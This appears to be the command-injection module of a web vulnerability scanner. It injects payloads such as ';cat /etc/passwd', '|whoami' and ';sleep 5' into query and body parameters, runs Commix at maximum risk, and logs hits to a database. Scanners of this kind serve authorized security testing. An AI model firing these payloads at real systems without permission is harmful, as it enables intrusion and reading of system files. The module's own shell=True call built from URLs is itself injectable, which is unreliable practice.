import requests
import re
import os
import time
import subprocess
import threading
import logging
import json
from urllib.parse import urlparse, urlencode, parse_qs
from sqlalchemy.exc import IntegrityError
from tools.database import Vulnerability, Endpoint # Import the Vulnerability and Endpoint models
from tools.database import try_save_vulnerability

# Define colors for console output
RED = '\033[0;31m'
GREEN = '\033[0;32m'
YELLOW = '\033[0;33m'
BLUE = '\033[0;34m'
MAGENTA = '\033[0;35m'
CYAN = '\033[0;36m'
NC = '\033[0m'
BOLD = '\033[1m'

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Global list to store vulnerabilities found during the scan
# This will be used to report the total count at the end.
found_vulnerabilities = []


# Function to execute a command and capture output (for general use)
def run_command_capture_output(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, check=False) # check=False because external tools might exit with non-zero on no findings
        return result.stdout.strip(), result.stderr.strip(), result.returncode
    except Exception as e:
        print(f"{RED}An unexpected error occurred during command execution: {e}{NC}")
        return "", str(e), 1

# Test for simple command injection
def test_simple_injection(endpoint_data, session, scan_id):
    url = endpoint_data['url']
    method = endpoint_data.get('method', 'GET')
    base_headers = endpoint_data.get('extra_headers', {})
    base_body_params = endpoint_data.get('body_params', {})

    print(f"{BLUE}[*] Testing simple command injection for: {url} ({method}){NC}")

    injection_payloads = [
        ";ls", ";ls -la", ";cat /etc/passwd", ";id", "&&ls", "&&id",
        "|ls", "|id", "`ls`", "$ (ls)",
        "%0a/bin/ls", "%0a`ls`", # URL encoded newlines for parameter injection
        "|whoami", "`whoami`", "||whoami", "&&whoami"
    ]

    # Helper to check response for common command output patterns
    def check_response_for_vulnerability(response_text):
        # Improved regex checks for false positive reduction
        # For 'ls' or 'dir'
        if re.search(r'(total\s+\d+|drwx|windows|linux)', response_text, re.IGNORECASE) and not re.search(r'error|fail|invalid', response_text, re.IGNORECASE):
            return True, "Directory listing detected."
        # For 'id' or 'whoami'
        if re.search(r'uid=|gid=|groups=|root|daemon|bin|sys|user', response_text, re.IGNORECASE) and not re.search(r'error|fail|invalid', response_text, re.IGNORECASE):
            return True, "User/group information detected."
        # For '/etc/passwd'
        if re.search(r'root:x:0:0:|daemon:x:|bin:x:', response_text, re.IGNORECASE) and not re.search(r'error|fail|invalid', response_text, re.IGNORECASE):
            return True, "/etc/passwd content detected."
        return False, None

    # Test query parameters for GET requests
    if method == "GET":
        parsed_url = urlparse(url)
        base_url_without_query = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        query_params = parse_qs(parsed_url.query)

        if not query_params:
            logger.info(f"Skipping {url}: No query parameters found for simple injection test.")
            return

        for param_name, original_values in query_params.items():
            original_value = original_values[0] # Take the first value if multiple for same param
            for payload in injection_payloads:
                test_params = query_params.copy()
                test_params[param_name] = f"{original_value}{payload}"
                
                test_url = base_url_without_query + "?" + urlencode(test_params, doseq=True)

                try:
                    response = requests.get(test_url, headers=base_headers, timeout=5)
                    is_vuln, evidence = check_response_for_vulnerability(response.text)
                    
                    if is_vuln:
                        vuln_data = {
                            "vulnerability": "Command Injection (Simple)",
                            "severity": "high",
                            "url": test_url,
                            "method": method,
                            "parameter": param_name,
                            "payload": payload,
                            "response_snippet": response.text[:500],
                            "evidence": evidence,
                            "description": f"Command injection detected via GET parameter '{param_name}' using payload '{payload}'. Evidence: {evidence}"
                        }
                        try_save_vulnerability(vuln_data, session, scan_id)
                        print(f"{GREEN}   [+] Command Injection (Simple) found at: {test_url} with payload '{payload}'{NC}")
                        return # Found one, move to next endpoint
                except requests.exceptions.RequestException as e:
                    logger.debug(f"Request failed for {test_url}: {e}")
                except Exception as e:
                    logger.error(f"Error during simple injection test for {test_url}: {e}")
    
    # Test body parameters for POST, PUT, PATCH requests
    if method in ["POST", "PUT", "PATCH"]:
        if not base_body_params:
            logger.info(f"Skipping {url}: No body parameters found for simple injection test for {method} request.")
            return

        for param_name, original_value in base_body_params.items():
            for payload in injection_payloads:
                test_body = base_body_params.copy()
                test_body[param_name] = f"{original_value}{payload}"
                
                # Determine Content-Type and format body accordingly
                content_type = base_headers.get("Content-Type", "").lower()
                req_data_to_send = test_body
                if "application/json" in content_type:
                    req_data_to_send = json.dumps(test_body)
                elif "application/x-www-form-urlencoded" in content_type:
                    req_data_to_send = urlencode(test_body)

                try:
                    response = requests.request(method, url, headers=base_headers, data=req_data_to_send, timeout=5)
                    is_vuln, evidence = check_response_for_vulnerability(response.text)

                    if is_vuln:
                        vuln_data = {
                            "vulnerability": "Command Injection (Simple)",
                            "severity": "high",
                            "url": url,
                            "method": method,
                            "parameter": param_name,
                            "payload": payload,
                            "response_snippet": response.text[:500],
                            "evidence": evidence,
                            "description": f"Command injection detected via {method} body parameter '{param_name}' using payload '{payload}'. Evidence: {evidence}"
                        }
                        try_save_vulnerability(vuln_data, session, scan_id)
                        print(f"{GREEN}   [+] Command Injection (Simple) found at: {url} ({method}) with payload '{payload}'{NC}")
                        return # Found one, move to next endpoint
                except requests.exceptions.RequestException as e:
                    logger.debug(f"Request failed for {url} ({method}): {e}")
                except Exception as e:
                    logger.error(f"Error during simple injection test for {url} ({method}): {e}")

# Test for time-based command injection
def test_time_based_injection(endpoint_data, session, scan_id):
    url = endpoint_data['url']
    method = endpoint_data.get('method', 'GET')
    base_headers = endpoint_data.get('extra_headers', {})
    base_body_params = endpoint_data.get('body_params', {})

    print(f"{BLUE}[*] Testing time-based command injection for: {url} ({method}){NC}")

    sleep_payloads = [
        ";sleep 5", "&&sleep 5", "|sleep 5",
        "$(sleep 5)", "`sleep 5`",
        "%0asleep%205" # URL encoded
    ]
    
    delay_threshold = 4.5 # seconds

    # Test query parameters for GET requests
    if method == "GET":
        parsed_url = urlparse(url)
        base_url_without_query = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
        query_params = parse_qs(parsed_url.query)

        if not query_params:
            logger.info(f"Skipping {url}: No query parameters found for time-based injection test.")
            return

        for param_name, original_values in query_params.items():
            original_value = original_values[0]
            for payload in sleep_payloads:
                test_params = query_params.copy()
                test_params[param_name] = f"{original_value}{payload}"
                
                test_url = base_url_without_query + "?" + urlencode(test_params, doseq=True)

                start_time = time.time()
                try:
                    response = requests.get(test_url, headers=base_headers, timeout=10) # Longer timeout
                    end_time = time.time()
                    elapsed_time = end_time - start_time

                    if elapsed_time >= delay_threshold:
                        vuln_data = {
                            "vulnerability": "Command Injection (Time-Based)",
                            "severity": "high",
                            "url": test_url,
                            "method": method,
                            "parameter": param_name,
                            "payload": payload,
                            "delay_detected_seconds": f"{elapsed_time:.2f}",
                            "description": f"Time-based command injection detected via GET parameter '{param_name}' using payload '{payload}'. Response delayed by {elapsed_time:.2f}s."
                        }
                        try_save_vulnerability(vuln_data, session, scan_id)
                        print(f"{GREEN}   [+] Command Injection (Time-Based) found at: {test_url} with payload '{payload}' (Delay: {elapsed_time:.2f}s){NC}")
                        return # Found one, move to next endpoint
                except requests.exceptions.Timeout:
                    end_time = time.time()
                    elapsed_time = end_time - start_time
                    if elapsed_time >= delay_threshold:
                        vuln_data = {
                            "vulnerability": "Command Injection (Time-Based - Timeout)",
                            "severity": "high",
                            "url": test_url,
                            "method": method,
                            "parameter": param_name,
                            "payload": payload,
                            "delay_detected_seconds": f"{elapsed_time:.2f}",
                            "description": f"Time-based command injection detected (timeout) via GET parameter '{param_name}' using payload '{payload}'. Response delayed by {elapsed_time:.2f}s."
                        }
                        try_save_vulnerability(vuln_data, session, scan_id)
                        print(f"{GREEN}   [+] Command Injection (Time-Based - Timeout) found at: {test_url} with payload '{payload}' (Delay: {elapsed_time:.2f}s){NC}")
                        return
                except requests.exceptions.RequestException as e:
                    logger.debug(f"Request failed for {test_url}: {e}")
                except Exception as e:
                    logger.error(f"Error during time-based injection test for {test_url}: {e}")
    
    # Test body parameters for POST, PUT, PATCH requests
    if method in ["POST", "PUT", "PATCH"]:
        if not base_body_params:
            logger.info(f"Skipping {url}: No body parameters found for time-based injection test for {method} request.")
            return

        for param_name, original_value in base_body_params.items():
            for payload in sleep_payloads:
                test_body = base_body_params.copy()
                test_body[param_name] = f"{original_value}{payload}"
                
                content_type = base_headers.get("Content-Type", "").lower()
                req_data_to_send = test_body
                if "application/json" in content_type:
                    req_data_to_send = json.dumps(test_body)
                elif "application/x-www-form-urlencoded" in content_type:
                    req_data_to_send = urlencode(test_body)

                start_time = time.time()
                try:
                    response = requests.request(method, url, headers=base_headers, data=req_data_to_send, timeout=10)
                    end_time = time.time()
                    elapsed_time = end_time - start_time

                    if elapsed_time >= delay_threshold:
                        vuln_data = {
                            "vulnerability": "Command Injection (Time-Based)",
                            "severity": "high",
                            "url": url,
                            "method": method,
                            "parameter": param_name,
                            "payload": payload,
                            "delay_detected_seconds": f"{elapsed_time:.2f}",
                            "description": f"Time-based command injection detected via {method} body parameter '{param_name}' using payload '{payload}'. Response delayed by {elapsed_time:.2f}s."
                        }
                        try_save_vulnerability(vuln_data, session, scan_id)
                        print(f"{GREEN}   [+] Command Injection (Time-Based) found at: {url} ({method}) with payload '{payload}' (Delay: {elapsed_time:.2f}s){NC}")
                        return # Found one, move to next endpoint
                except requests.exceptions.Timeout:
                    end_time = time.time()
                    elapsed_time = end_time - start_time
                    if elapsed_time >= delay_threshold:
                        vuln_data = {
                            "vulnerability": "Command Injection (Time-Based - Timeout)",
                            "severity": "high",
                            "url": url,
                            "method": method,
                            "parameter": param_name,
                            "payload": payload,
                            "delay_detected_seconds": f"{elapsed_time:.2f}",
                            "description": f"Time-based command injection detected (timeout) via {method} body parameter '{param_name}' using payload '{payload}'. Response delayed by {elapsed_time:.2f}s."
                        }
                        try_save_vulnerability(vuln_data, session, scan_id)
                        print(f"{GREEN}   [+] Command Injection (Time-Based - Timeout) found at: {url} ({method}) with payload '{payload}' (Delay: {elapsed_time:.2f}s){NC}")
                        return
                except requests.exceptions.RequestException as e:
                    logger.debug(f"Request failed for {url} ({method}): {e}")
                except Exception as e:
                    logger.error(f"Error during time-based injection test for {url} ({method}): {e}")

def run_commix_on_endpoint(endpoint_data, output_dir, session, scan_id):
    url = endpoint_data['url']
    method = endpoint_data.get('method', 'GET').upper()
    headers = endpoint_data.get('extra_headers', {})
    body_params = endpoint_data.get('body_params', {})

    print(f"{YELLOW}[+] Running Commix for deeper command injection scanning on: {url} ({method}){NC}")

    # Check if commix is installed
    stdout, stderr, returncode = run_command_capture_output("command -v commix")
    if returncode != 0:
        print(f"{RED}[!] Commix is not installed or not in PATH. Please install it to use advanced command injection scanning. Skipping.{NC}")
        return

    temp_req_file_path = None
    commix_command_parts = [
        "commix",
        f"--output-dir=\"{output_dir}\"",
        "--batch",
        "--level=3", # Adjust level for depth
        "--risk=3"   # Adjust risk for aggressiveness
    ]

    if method == "GET":
        commix_command_parts.append(f"-u \"{url}\"")
    else: # POST, PUT, PATCH, DELETE
        # Create a temporary file for Commix input for non-GET methods
        temp_req_filename = f"commix_req_{abs(hash(url))}_{method}.txt"
        temp_req_file_path = os.path.join(output_dir, temp_req_filename)
        
        with open(temp_req_file_path, "w") as f:
            f.write(f"{method} {urlparse(url).path}?{urlparse(url).query} HTTP/1.1\n")
            f.write(f"Host: {urlparse(url).netloc}\n")
            for header, value in headers.items():
                f.write(f"{header}: {value}\n")
            f.write("\n")
            # Handle JSON body specifically, or form-urlencoded
            content_type = headers.get("Content-Type", "").lower()
            if "application/json" in content_type:
                f.write(json.dumps(body_params))
            elif "application/x-www-form-urlencoded" in content_type:
                f.write(urlencode(body_params))
            else:
                f.write(str(body_params)) # Fallback if not specifically handled

        commix_command_parts.append(f"--req=\"{temp_req_file_path}\"")

    commix_command = " ".join(commix_command_parts)
    
    stdout, stderr, returncode = run_command_capture_output(commix_command)
    
    print(f"{GREEN}[+] Commix scan completed for {url}{NC}")
    
    # Parse Commix output for vulnerabilities
    # Commix usually prints "vulnerable" or "injection found" if successful.
    if "vulnerable" in stdout.lower() or "injection found" in stdout.lower():
        vuln_type = "Command Injection (Commix)"
        severity = "high"
        description = f"Commix reported command injection vulnerability for {url} ({method}).\nCommix Output:\n{stdout}"
        
        # Attempt to extract more specific details from Commix output
        payload_match = re.search(r"payload: '(.*?)'", stdout)
        payload = payload_match.group(1) if payload_match else "N/A"

        param_match = re.search(r"parameter '(.*?)' is vulnerable", stdout)
        parameter = param_match.group(1) if param_match else "N/A"

        vuln_data = {
            "vulnerability": vuln_type,
            "severity": severity,
            "url": url,
            "method": method,
            "tool": "Commix",
            "parameter": parameter,
            "payload": payload,
            "description": description,
            "commix_full_output": stdout # Store full output for debugging/context
        }
        try_save_vulnerability(vuln_data, session, scan_id)
        print(f"{GREEN}   [+] Command Injection (Commix) stored for: {url}{NC}")
    else:
        print(f"{YELLOW}   [!] Commix did not report any vulnerabilities for {url}.{NC}")
    
    # Clean up temporary request file
    if temp_req_file_path and os.path.exists(temp_req_file_path):
        os.remove(temp_req_file_path)
        print(f"{GREEN}[+] Cleaned up temporary request file: {temp_req_file_path}{NC}")

# Main command injection function
def commandinjection(output_dir, session=None, scan_id=None, fallback_url=None):
    """
    Performs command injection testing on URLs and endpoints from the database.
    If no endpoints are found in the database, it can test a single fallback_url.
    Results are stored in the database.
    """
    print(f"{YELLOW}[+] Starting Command Injection scan...{NC}")
    
    if session is None or scan_id is None:
        print(f"{RED}[!] Database session or scan_id not provided. Cannot perform Command Injection scan.{NC}")
        return

    global found_vulnerabilities
    found_vulnerabilities = [] # Reset for each scan

    endpoints_to_test_data = []

    # Fetch endpoints from the database for the current scan
    db_endpoints = session.query(Endpoint).filter_by(scan_id=scan_id).all()

    if db_endpoints:
        print(f"{BLUE}[*] Found {len(db_endpoints)} endpoints in the database for scan ID {scan_id}.{NC}")
        for ep in db_endpoints:
            endpoints_to_test_data.append({
                "url": ep.url,
                "method": ep.method,
                "body_params": json.loads(ep.body_params) if isinstance(ep.body_params, str) and ep.body_params else {},
                "extra_headers": json.loads(ep.extra_headers) if isinstance(ep.extra_headers, str) and ep.extra_headers else {}
            })
    elif fallback_url:
        print(f"{YELLOW}[!] No endpoints found in the database for scan_id {scan_id}. Using fallback URL: {fallback_url}{NC}")
        # For fallback_url, we assume GET method and no body/headers unless specified.
        # In a real scenario, you might want to allow method/headers/body for fallback_url too.
        endpoints_to_test_data.append({
            "url": fallback_url,
            "method": "GET", # Default to GET for fallback if not specified
            "body_params": {},
            "extra_headers": {}
        })
    else:
        print(f"{RED}[!] No endpoints found in the database and no fallback_url provided. Cannot perform Command Injection scan.{NC}")
        return

    max_threads = 5 # Limit threads for this specific test to avoid overwhelming the target/rate limits
    
    threads = []
    for endpoint_data in endpoints_to_test_data:
        # Create threads for each test type
        t_simple = threading.Thread(target=test_simple_injection, args=(endpoint_data, session, scan_id))
        t_time_based = threading.Thread(target=test_time_based_injection, args=(endpoint_data, session, scan_id))
        t_commix = threading.Thread(target=run_commix_on_endpoint, args=(endpoint_data, output_dir, session, scan_id))
        
        threads.extend([t_simple, t_time_based, t_commix])
        
        t_simple.start()
        t_time_based.start()
        t_commix.start()

    for t in threads:
        t.join() # Wait for all threads to complete

    print(f"{GREEN}[+] Command Injection scan completed. Total vulnerabilities found and stored: {len(found_vulnerabilities)}{NC}")

# This part is for direct testing of the module
if __name__ == "__main__":
    # This is for testing purposes only. In production, this is called from VulnScanX.py.
    from tools.database import init_db, get_session, Base, ScanHistory, Endpoint # For local testing

    # Initialize a temporary database for testing
    temp_db_engine = init_db('sqlite:///test_command_injection_with_commix.db')
    test_session = get_session(temp_db_engine)
    
    # Create a dummy ScanHistory record for testing
    test_domain = "test-ci-target-with-commix.com"
    test_scan = test_session.query(ScanHistory).filter_by(domain=test_domain).first()
    if not test_scan:
        test_scan = ScanHistory(domain=test_domain)
        test_session.add(test_scan)
        test_session.commit()
    test_scan_id = test_scan.id

    dummy_output_dir = "test_ci_output_with_commix"
    os.makedirs(dummy_output_dir, exist_ok=True)
    
    # Add dummy endpoints to the database for testing POST/PUT/GET with Command Injection
    dummy_endpoints_data = [
        {"url": "http://testphp.vulnweb.com/listproducts.php?cat=1", "method": "GET", "body_params": {}, "extra_headers": {}},
        {"url": "http://example.com/submit", "method": "POST", "body_params": {"name": "test", "comment": "hello"}, "extra_headers": {"Content-Type": "application/x-www-form-urlencoded"}},
        {"url": "http://example.com/api/update/item", "method": "PUT", "body_params": {"item_id": 123, "description": "new_desc"}, "extra_headers": {"Content-Type": "application/json"}},
    ]
    for ep_data in dummy_endpoints_data:
        try:
            new_endpoint = Endpoint(
                scan_id=test_scan_id,
                url=ep_data["url"],
                method=ep_data["method"],
                body_params=json.dumps(ep_data["body_params"]),
                extra_headers=json.dumps(ep_data["extra_headers"])
            )
            test_session.add(new_endpoint)
            test_session.commit()
        except IntegrityError:
            test_session.rollback()
            logger.info(f"Duplicate endpoint added for testing: {ep_data['url']}")
        except Exception as db_e:
            test_session.rollback()
            logger.error(f"Error adding dummy endpoint to DB: {db_e}")

    print(f"{BLUE}[+] Running Command Injection test with database integration...{NC}")
    # Example of running with database endpoints
    commandinjection(output_dir=dummy_output_dir, session=test_session, scan_id=test_scan_id)
    
    # Example of running with a fallback URL if DB is empty (uncomment to test)
    # print(f"\n{BLUE}[+] Running Command Injection test with fallback URL...{NC}")
    # commandinjection(output_dir=dummy_output_dir, session=test_session, scan_id=test_scan_id + 1, fallback_url="http://fallback.example.com/search?query=test")

    print(f"{BLUE}[+] Verifying results from database...{NC}")
    retrieved_vulns = test_session.query(Vulnerability).filter_by(scan_id=test_scan_id).all()
    for vuln in retrieved_vulns:
        print(f"   Vulnerability Found: {vuln.vulnerability_type} at {vuln.url} (Severity: {vuln.severity})")
        print(f"     Full Data: {vuln.vulnerability_data}")

    test_session.close()
    
    # Clean up test directory (Commix creates subfolders)
    import shutil
    if os.path.exists(dummy_output_dir):
        try:
            shutil.rmtree(dummy_output_dir)
            print(f"{GREEN}[+] Cleaned up directory: {dummy_output_dir}{NC}")
        except OSError as e:
            print(f"{RED}Error removing directory {dummy_output_dir}: {e}{NC}")
    
    # Clean up test database file
    if os.path.exists('test_command_injection_with_commix.db'):
        os.remove('test_command_injection_with_commix.db')

    print(f"{GREEN}[+] Command Injection test with Commix completed.{NC}")
